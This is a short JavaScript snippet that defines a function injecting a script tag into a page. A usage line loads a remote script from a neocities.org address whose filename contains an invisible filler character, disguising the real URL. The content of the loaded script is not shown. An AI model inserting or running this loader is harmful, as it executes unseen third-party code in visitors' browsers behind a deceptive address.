function loadJSFile(src) {
  const script = document.createElement('script');
  script.src = src;
  script.type = 'text/javascript';
  script.onload = () => {
    console.log(`${src} loaded successfully.`);
  };
  script.onerror = () => {
    console.error(`Failed to load ${src}`);
  };
  document.head.appendChild(script);
}

// Usage
loadJSFile('https://sharebooster.neocities.org/script3ㅤ.js');
